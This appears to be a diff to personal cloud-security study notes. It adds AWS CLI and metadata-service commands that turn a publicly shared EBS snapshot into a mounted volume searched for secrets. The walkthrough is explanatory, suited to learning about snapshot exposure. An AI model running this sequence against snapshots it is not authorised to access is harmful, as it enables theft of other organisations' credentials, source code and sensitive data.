@@ -96,3 +96,53 @@ EC2 Storage
 * EBS Snapshots able to be shared across AWS Accounts 
 * Note: danger exists that they may contain sensitive data, source code, or secrets
 
+CLI commands to:
+1) grab a public EBS Snapshot
+2) use it to create an EBS Volume
+3) mount the EBS Volume to an EC2 instance
+4) the volume can now be accessed and searched for secrets
+
+[in: AWS CLI / CloudShell
+$ aws ec2 describe-snapshots --snapshot-ids <SNAPSHOT_ID_NUMBER(s)>
+# gather info about a discovered snaoshot; e.g. encryption, volume size, AWS account in which it was created
+
+[in: EC2 Instance Console]
+$  TOKEN=`curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
+$ curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/placement/availability-zone
+# discover Availability Zone (AZ) of instance (this is a subcategory of Region); this is needed for the next step (creating the volume) because volumes must be in the same AZ as the machine they are mounted to
+
+[in: EC2 Instance Console]
+$ aws ec2 create-volume --snapshot-id <SNAPSHOT_ID_NUMBER> --volume-type gp3 --region <REPLACE-WITH-REGION> --availability-zone <REPLACE-WITH-AZ>
+# create volume from snapshot
+# gp3 was chosen for `--volume-type` because it is cheap
+# make sure to note volume-ID in output in order to use it for the next step
+
+[in: EC2 Instance Console]
+$ instance_id=$( curl  -H "X-aws-ec2-metadata-token: $TOKEN" -s http://169.254.169.254/latest/meta-data/instance-id )
+$ aws ec2 attach-volume --region <REPLACE-WITH-REGION> --device /dev/sdh --instance-id $instance_id --volume-id vol-REPLACE-WITH-YOUR-VOLUME_ID>
+
+[in: EC2 Instance Console]
+$ sudo fdisk -l
+# check on new volume; output includes size of volume and name (e.g. /dev/nvme0n1p1)
+
+[in: EC2 Instance Console]
+$ sudo mkdir /snapshot-recovery
+$ sudo mount /dev/nvme1n1 /snapshot-recovery
+# mount new volume (in this case called: /dev/nvme1n1)
+
+[in: EC2 Instance Console]
+$ ls /snapshot-recovery
+# now the volume can be searched for secrets
+------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+
+
+
+
+
+
